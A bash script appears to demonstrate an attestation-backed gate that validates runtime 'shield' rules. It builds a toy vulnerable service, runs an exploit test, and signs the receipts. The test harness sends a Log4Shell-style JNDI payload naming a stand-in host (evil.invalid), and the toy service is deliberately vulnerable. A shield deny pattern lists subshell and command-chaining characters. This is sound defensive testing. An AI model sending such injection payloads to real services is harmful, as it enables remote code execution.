#!/usr/bin/env bash
# End-to-end showcase: Playbox Attested Gate (TPM 2.0 T2 + Hybrid PQ) as the
# upstream validation gate for Shirudo-style runtime shields (.bee artifacts).
#
# Runs on Linux (bare-metal RPi5 or x86_64):
#   1. Uses hardware /dev/tpmrm0 if present, otherwise boots a real swtpm TPM 2.0
#      with EK cert + SHA-256 PCR bank and records boot PCRs (0, 7).
#   2. Generates a TPM 2.0 T2 attestation (AK pinned + PCR 23 host measurements
#      + boot PCRs 0,7) and starts a Playbox Docker-confined room with PLAYBOX_ATTEST=tpm.
#   3. Joins with --min-host-tier t2 (live T2 verification) and runs 3 sandboxed
#      CVE-to-shield validation tasks:
#        - Baseline (unshielded): confirms CVE exploit succeeds
#        - Over-broad bad_shield.bee: blocks exploit but breaks benign traffic -> REJECT
#        - Targeted valid_shield.bee: blocks exploit + 5/5 benign pass -> PROMOTE
#   4. Signs both playbox.attested_gate_receipt.v1 receipts (binding each .bee
#      SHA-256) with hybrid Ed25519 + ML-DSA-65 and exports a 5-gate
#      playbox.attested_gate.v1 compliance bundle.
#   5. Verifies the bundle offline with --require-signature --require-pq --require-tier t2.
#
# Usage:
#   PLAYBOX_BIN=~/playbox-v046/playbox OUT_DIR=/tmp/shirudo-e2e-out ./scripts/shirudo-gate-e2e.sh
set -euo pipefail

PB="${PLAYBOX_BIN:-playbox}"
OUT_DIR="${OUT_DIR:-/tmp/shirudo-gate-e2e-out}"
mkdir -p "$OUT_DIR"

say() { printf '\n==> %s\n' "$*"; }
ok()  { printf '    [OK] %s\n' "$*"; }
die() { printf '    [FAIL] %s\n' "$*" >&2; exit 1; }

for cmd in "$PB" docker git python3 tpm2_pcrread tpm2_quote; do
  command -v "$cmd" >/dev/null 2>&1 || die "missing required command: $cmd"
done
docker info >/dev/null 2>&1 || die "Docker daemon is not reachable"

WORK=$(mktemp -d /tmp/playbox-shirudo-XXXXXX)
HOST_PID=""
SWTPM_PID=""
cleanup() {
  [ -n "$HOST_PID" ] && kill "$HOST_PID" 2>/dev/null || true
  [ -n "$SWTPM_PID" ] && kill "$SWTPM_PID" 2>/dev/null || true
  rm -rf "$WORK"
}
trap cleanup EXIT INT TERM

# ---------------------------------------------------------------------------
say "1. Initialize TPM 2.0 (hardware /dev/tpmrm0 or swtpm) & read boot PCRs"
TPM_MODE="hardware"
if [ -r /dev/tpmrm0 ] && [ -w /dev/tpmrm0 ]; then
  unset TPM2TOOLS_TCTI || true
  ok "using hardware TPM at /dev/tpmrm0"
else
  command -v swtpm >/dev/null 2>&1 || die "no /dev/tpmrm0 and swtpm is not installed"
  command -v swtpm_setup >/dev/null 2>&1 || die "swtpm_setup is not installed"
  TPM_MODE="swtpm"
  mkdir -p "$WORK/tpmstate"
  SWTPM_PORT=$((23210 + ($$ % 1000)))
  SWTPM_CTRL=$((SWTPM_PORT + 1))
  swtpm_setup --tpm2 \
    --tpmstate "$WORK/tpmstate" \
    --createek \
    --pcr-banks sha256 \
    --overwrite > "$WORK/swtpm_setup.log" 2>&1 || { cat "$WORK/swtpm_setup.log"; die "swtpm_setup failed"; }
  swtpm socket --tpm2 \
    --tpmstate "dir=$WORK/tpmstate" \
    --server "type=tcp,port=$SWTPM_PORT" \
    --ctrl "type=tcp,port=$SWTPM_CTRL" \
    --flags startup-clear \
    --daemon \
    --pid "file=$WORK/swtpm.pid"
  SWTPM_PID=$(cat "$WORK/swtpm.pid")
  export TPM2TOOLS_TCTI="swtpm:host=127.0.0.1,port=$SWTPM_PORT"
  # Wait for swtpm to accept commands
  for _ in $(seq 1 20); do
    tpm2_pcrread sha256:0 >/dev/null 2>&1 && break
    sleep 0.2
  done
  ok "started swtpm TPM 2.0 on 127.0.0.1:$SWTPM_PORT (mode=$TPM_MODE)"
fi

# Read real SHA-256 boot PCRs 0 and 7 for T2 reference verification
BOOT_PCRS=$(python3 - <<'PY'
import re, subprocess
out = subprocess.check_output(["tpm2_pcrread", "sha256:0,7"], text=True)
pcrs = {}
for line in out.splitlines():
    m = re.match(r"^\s*(\d+)\s*:\s*0x([0-9a-fA-F]{64})\s*$", line)
    if m:
        pcrs[int(m.group(1))] = m.group(2).lower()
assert 0 in pcrs and 7 in pcrs, f"failed to parse PCRs 0,7 from:\n{out}"
print(f"0:{pcrs[0]},7:{pcrs[7]}")
PY
)
export PLAYBOX_TPM_BOOT_PCRS="$BOOT_PCRS"
printf '%s\n' "$BOOT_PCRS" > "$OUT_DIR/boot_pcrs.txt"
printf '%s\n' "$TPM_MODE" > "$OUT_DIR/tpm_mode.txt"
ok "boot PCR reference: $BOOT_PCRS"

# ---------------------------------------------------------------------------
say "2. Produce TPM 2.0 T2 host attestation & pin device AK"
mkdir -p "$WORK/host" "$WORK/guest1" "$WORK/guest2" "$WORK/guest3" "$WORK/state"
"$PB" attest --home "$WORK/host" --log "$WORK/host_attest.log" --platform tpm >/dev/null
VERIFY_OUT=$("$PB" verify --home "$WORK/host" "$WORK/host_attest.log" 2>&1 || true)
TPM_FP=$(printf '%s\n' "$VERIFY_OUT" | sed -n 's/.*playbox pin add tpm \([0-9a-fA-F]\{16,\}\).*/\1/p' | head -n 1)
[ -n "$TPM_FP" ] || { printf '%s\n' "$VERIFY_OUT"; die "could not extract TPM AK fingerprint"; }
printf '%s\n' "$TPM_FP" > "$OUT_DIR/tpm_device_fp.txt"

for h in "$WORK/host" "$WORK/guest1" "$WORK/guest2" "$WORK/guest3"; do
  "$PB" pin add --home "$h" tpm "$TPM_FP" >/dev/null
done

VERIFY_T2=$("$PB" verify --home "$WORK/host" "$WORK/host_attest.log" 2>&1)
printf '%s\n' "$VERIFY_T2" | grep -q "T2" || { printf '%s\n' "$VERIFY_T2"; die "host attestation did not reach T2"; }
ok "TPM AK pinned ($TPM_FP) and verified at T2"

# ---------------------------------------------------------------------------
say "3. Create vulnerable target repo + sealed exploit/regression gate"
git init -q -b main "$WORK/repo"
cat > "$WORK/repo/service.sh" <<'EOF'
#!/bin/sh
# Minimal target service mimicking an input-validation RCE (e.g. Java4Shell/PHP eval path).
# Usage: ./service.sh <payload> [shield.bee]
set -eu
PAYLOAD="$1"
SHIELD="${2:-}"

if [ -n "$SHIELD" ] && [ -f "$SHIELD" ]; then
  # Runtime shield hook: evaluate .bee shield rules before reaching vulnerable sink
  if grep -q '^ACTION=DENY_ALL$' "$SHIELD"; then
    echo "BLOCKED:deny_all"
    exit 43
  fi
  if grep -q '^HOOK=input_validate$' "$SHIELD" && grep -q '^DENY_PATTERN=JNDI_OR_SUBSHELL$' "$SHIELD"; then
    case "$PAYLOAD" in
      *'${jndi:'*|*'$('*|*'`'*|*';'*|*'&&'*)
        echo "BLOCKED:shield_matched"
        exit 43
        ;;
    esac
  fi
fi

# Vulnerable sink (unshielded path): executes crafted subshell/jndi marker
case "$PAYLOAD" in
  *'${jndi:'*)
    # Simulate RCE side-effect (canary dropped)
    echo "EXPLOITED" > /tmp/pwned
    echo "500:EXPLOIT_TRIGGERED"
    exit 0
    ;;
esac

echo "200:OK:${PAYLOAD}"
EOF
chmod +x "$WORK/repo/service.sh"

cat > "$WORK/repo/gate_eval.sh" <<'EOF'
#!/bin/sh
# Sealed evaluation harness: checks exploit blocking, benign traffic, and network isolation.
# Usage: ./gate_eval.sh [shield.bee]
set -eu
SHIELD="${1:-}"
rm -f /tmp/pwned

# 1. Exploit PoC (must be blocked, /tmp/pwned must NOT exist)
EXPLOIT_BLOCKED=0
set +e
OUT=$(./service.sh '${jndi:ldap://evil.invalid/exploit}' "$SHIELD" 2>&1)
RC=$?
set -e
if [ "$RC" -eq 43 ] && [ ! -f /tmp/pwned ]; then
  EXPLOIT_BLOCKED=1
fi

# 2. Benign regression suite (5 legitimate payloads must all return 200:OK:*)
BENIGN_PASS=0
for p in "healthcheck" "user=alice" "search=playbox-v046" "doc=invoice-2026" "metrics=ok"; do
  set +e
  BOUT=$(./service.sh "$p" "$SHIELD" 2>&1)
  BRC=$?
  set -e
  if [ "$BRC" -eq 0 ] && [ "$BOUT" = "200:OK:${p}" ]; then
    BENIGN_PASS=$((BENIGN_PASS + 1))
  fi
done

# 3. Network isolation check inside sandbox
NET_ISOLATED=1
if wget -q -T 2 -O /dev/null http://1.1.1.1/ 2>/dev/null; then
  NET_ISOLATED=0
fi

echo "GATE_RESULT exploit_blocked=${EXPLOIT_BLOCKED} benign_pass=${BENIGN_PASS}/5 net_isolated=${NET_ISOLATED}"
EOF
chmod +x "$WORK/repo/gate_eval.sh"

(
  cd "$WORK/repo"
  git config user.email "gate@playbox.local"
  git config user.name "Playbox Gate"
  git add service.sh gate_eval.sh
  git commit -qm "target service and sealed exploit+regression gate"
)
BASE_COMMIT=$(git -C "$WORK/repo" rev-parse HEAD)
ok "target repo ready at commit ${BASE_COMMIT:0:12}"

# ---------------------------------------------------------------------------
say "4. Start Playbox host on Linux with PLAYBOX_ATTEST=tpm + Docker sandbox"
PLAYBOX_ATTEST=tpm "$PB" up \
  --local \
  --home "$WORK/host" \
  --state "$WORK/state" \
  --repo "$WORK/repo" \
  --docker \
  --max-members 3 \
  --link-uses 3 > "$WORK/up.log" 2>&1 &
HOST_PID=$!

for i in $(seq 1 120); do
  grep -q '^playbox://' "$WORK/up.log" && break
  kill -0 "$HOST_PID" 2>/dev/null || { cat "$WORK/up.log"; die "host exited early"; }
  sleep 0.25
done
LINK=$(grep -o '^playbox://[^ ]*' "$WORK/up.log" | head -n 1)
[ -n "$LINK" ] || { cat "$WORK/up.log"; die "no invite link printed"; }
ok "host listening with TPM attestation enabled"

# ---------------------------------------------------------------------------
say "5. Live T2 cross-verification + 3 sandboxed Shirudo shield evaluations"

# Task 1: Baseline (unshielded)
"$PB" join "$LINK" --local --home "$WORK/guest1" --min-host-tier t2 \
  --task './gate_eval.sh' > "$WORK/task1.log" 2>&1 || { cat "$WORK/task1.log"; die "task 1 failed"; }
grep -q "GATE_RESULT exploit_blocked=0 benign_pass=5/5 net_isolated=1" "$WORK/task1.log" \
  || { cat "$WORK/task1.log"; die "unexpected baseline result"; }
ok "Task 1 (baseline, live T2 verified): exploit_blocked=0 benign_pass=5/5 net_isolated=1 (CVE reproduced)"

# Craft bad_shield.bee (over-broad deny-all shield)
cat > "$OUT_DIR/bad_shield.bee" <<'EOF'
SHIRUDO_BEE_V1
TARGET=service.sh
HOOK=input_validate
ACTION=DENY_ALL
EOF
BAD_SHA=$(sha256sum "$OUT_DIR/bad_shield.bee" | awk '{print $1}')

# Task 2: Bad shield (breaks benign traffic -> REJECT)
"$PB" join "$LINK" --local --home "$WORK/guest2" --min-host-tier t2 \
  --task 'cat > bad_shield.bee << "SHIELD"
SHIRUDO_BEE_V1
TARGET=service.sh
HOOK=input_validate
ACTION=DENY_ALL
SHIELD
./gate_eval.sh bad_shield.bee' > "$WORK/task2.log" 2>&1 || { cat "$WORK/task2.log"; die "task 2 failed"; }
grep -q "GATE_RESULT exploit_blocked=1 benign_pass=0/5 net_isolated=1" "$WORK/task2.log" \
  || { cat "$WORK/task2.log"; die "unexpected bad-shield result"; }
ok "Task 2 (bad_shield.bee, live T2 verified): exploit_blocked=1 benign_pass=0/5 -> REJECT (benign regression)"

# Craft valid_shield.bee (targeted input-validation shield)
cat > "$OUT_DIR/valid_shield.bee" <<'EOF'
SHIRUDO_BEE_V1
TARGET=service.sh
HOOK=input_validate
DENY_PATTERN=JNDI_OR_SUBSHELL
ACTION=DROP_EXPLOIT_ALLOW_BENIGN
EOF
VALID_SHA=$(sha256sum "$OUT_DIR/valid_shield.bee" | awk '{print $1}')

# Task 3: Valid shield (blocks exploit + 5/5 benign pass -> PROMOTE)
"$PB" join "$LINK" --local --home "$WORK/guest3" --min-host-tier t2 \
  --task 'cat > valid_shield.bee << "SHIELD"
SHIRUDO_BEE_V1
TARGET=service.sh
HOOK=input_validate
DENY_PATTERN=JNDI_OR_SUBSHELL
ACTION=DROP_EXPLOIT_ALLOW_BENIGN
SHIELD
./gate_eval.sh valid_shield.bee' > "$WORK/task3.log" 2>&1 || { cat "$WORK/task3.log"; die "task 3 failed"; }
grep -q "GATE_RESULT exploit_blocked=1 benign_pass=5/5 net_isolated=1" "$WORK/task3.log" \
  || { cat "$WORK/task3.log"; die "unexpected valid-shield result"; }
ok "Task 3 (valid_shield.bee, live T2 verified): exploit_blocked=1 benign_pass=5/5 net_isolated=1 -> PROMOTE"

# Stop host cleanly so audit.log is flushed
kill "$HOST_PID" 2>/dev/null || true
wait "$HOST_PID" 2>/dev/null || true
HOST_PID=""

# ---------------------------------------------------------------------------
say "6. Sign hybrid Ed25519+ML-DSA-65 Gate 4 receipts bound to .bee SHA-256"
NOW_MS=$(python3 -c 'import time; print(int(time.time()*1000))')

python3 - "$OUT_DIR/receipt-bad-shield.json" "$OUT_DIR/receipt-valid-shield.json" \
  "$BASE_COMMIT" "$BAD_SHA" "$VALID_SHA" "$NOW_MS" "$TPM_MODE" <<'PY'
import json, sys
bad_p, valid_p, base_commit, bad_sha, valid_sha, now_ms, tpm_mode = sys.argv[1:]

bad = {
    "schema": "playbox.attested_gate_receipt.v1",
    "instance": "shirudo-cve-jndi-bad-shield",
    "base_commit": base_commit,
    "runtime": "docker",
    "timestamp_ms": int(now_ms),
    "verdict": "REJECT",
    "reason": "benign_regression_failed",
    "shield_artifact": {
        "name": "bad_shield.bee",
        "format": "shirudo.bee.v1",
        "sha256": bad_sha,
    },
    "metrics": {
        "exploit_blocked": True,
        "benign_passed": 0,
        "benign_total": 5,
        "net_isolated": True,
        "host_attestation_tier": "T2",
        "tpm_mode": tpm_mode,
    },
}

valid = {
    "schema": "playbox.attested_gate_receipt.v1",
    "instance": "shirudo-cve-jndi-valid-shield",
    "base_commit": base_commit,
    "runtime": "docker",
    "timestamp_ms": int(now_ms) + 1,
    "verdict": "PROMOTE",
    "reason": "exploit_blocked_and_benign_100pct",
    "shield_artifact": {
        "name": "valid_shield.bee",
        "format": "shirudo.bee.v1",
        "sha256": valid_sha,
    },
    "metrics": {
        "exploit_blocked": True,
        "benign_passed": 5,
        "benign_total": 5,
        "net_isolated": True,
        "host_attestation_tier": "T2",
        "tpm_mode": tpm_mode,
    },
}

open(bad_p, "w").write(json.dumps(bad, indent=2) + "\n")
open(valid_p, "w").write(json.dumps(valid, indent=2) + "\n")
PY

"$PB" gate sign --home "$WORK/host" "$OUT_DIR/receipt-bad-shield.json" >/dev/null
"$PB" gate sign --home "$WORK/host" "$OUT_DIR/receipt-valid-shield.json" >/dev/null
ok "signed bad_shield (REJECT, sha256=${BAD_SHA:0:12}...) and valid_shield (PROMOTE, sha256=${VALID_SHA:0:12}...) with Ed25519+ML-DSA-65"

# ---------------------------------------------------------------------------
say "7. Export & verify 5-gate T2 hybrid-PQ compliance bundle"
"$PB" release pq-keygen "$WORK/bundle.pq.key" >/dev/null
"$PB" gate export \
  --home "$WORK/host" \
  --state "$WORK/state" \
  --receipt "$OUT_DIR/receipt-bad-shield.json" \
  --receipt "$OUT_DIR/receipt-valid-shield.json" \
  --attestation "$WORK/host_attest.log" \
  --pq-key "$WORK/bundle.pq.key" \
  --out "$OUT_DIR/shirudo-gate-t2-bundle.json"

VERIFY_JSON=$("$PB" gate verify \
  --home "$WORK/host" \
  "$OUT_DIR/shirudo-gate-t2-bundle.json" \
  --require-signature \
  --require-pq \
  --require-tier t2 \
  --json)
printf '%s\n' "$VERIFY_JSON" > "$OUT_DIR/verify-linux.json"
ok "Linux offline verification passed (--require-signature --require-pq --require-tier t2)"
printf '%s\n' "$VERIFY_JSON"
